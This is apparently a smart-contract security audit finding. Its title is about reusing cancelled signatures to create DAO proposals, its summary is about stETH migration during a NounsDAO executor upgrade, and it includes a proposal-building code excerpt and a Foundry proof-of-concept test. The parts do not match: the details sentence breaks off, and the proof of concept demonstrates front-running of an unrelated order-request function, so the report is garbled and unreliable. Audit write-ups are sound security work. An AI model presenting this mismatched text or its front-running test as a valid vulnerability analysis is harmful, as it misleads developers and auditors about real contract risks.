# Proposer can create arbitrary number of proposals combining same signatures as long as proposal thresold is reached.

## Summary
Cancelled signature can be reused to create proposal, thus making cancelling useless.
As NounsDAOExecutorV2 will be newly deployed rather than upgraded, list of queued transactions will not be migrated.
Those transactions will still be executed by NounsDAOExecutorV2 v1.

But all stETH balance will be migrated to new executor by upgrade proposal, chances are already queued transactions to spend stETH will not be executed as there's no stETH left.

## Vulnerability Details
Before executing upgrade proposal, executeTransaction

```solidity
    function propose(
        NounsDAOLogicV1 daoProxy,
        address daoV3Implementation,
        address timelockV2,
        uint256 ethToSendToNewTimelock,
        address erc20Transferer,
        address forkEscrow,
        address forkDeployer,
        address[] memory erc20TokensToIncludeInFork,
        string memory description
    ) internal returns (uint256 proposalId) {
        uint8 numTxs = 10;
        ...

        i++;
        targets[i] = erc20Transferer;
        values[i] = 0;
        signatures[i] = 'transferEntireBalance(address,address)';
        calldatas[i] = abi.encode(STETH_MAINNET, timelockV2);
        ...

```

## Proof of Concept 
```solidity
 function testFrontrunningRequestOrder() public {
        address malicious = address(0x6);
        address victim = user;

        paymentToken.mint(malicious, dummyOrder.quantityIn);
        paymentToken.mint(victim, dummyOrder.quantityIn);

        // 1. Frontrunning malicious's requestOrder - success
        vm.startPrank(malicious);
        paymentToken.increaseAllowance(address(issuer), dummyOrder.quantityIn);
        issuer.requestOrder(dummyOrder, salt);

        // 2. Victim's requestOrder - failed
        vm.startPrank(victim);
        paymentToken.increaseAllowance(address(issuer), dummyOrder.quantityIn);
        vm.expectRevert(OrderProcessor.DuplicateOrder.selector);
        issuer.requestOrder(dummyOrder, salt);

        // 3. Then request cancel
        vm.startPrank(malicious);
        issuer.requestCancel(dummyOrder, salt);
    }
```
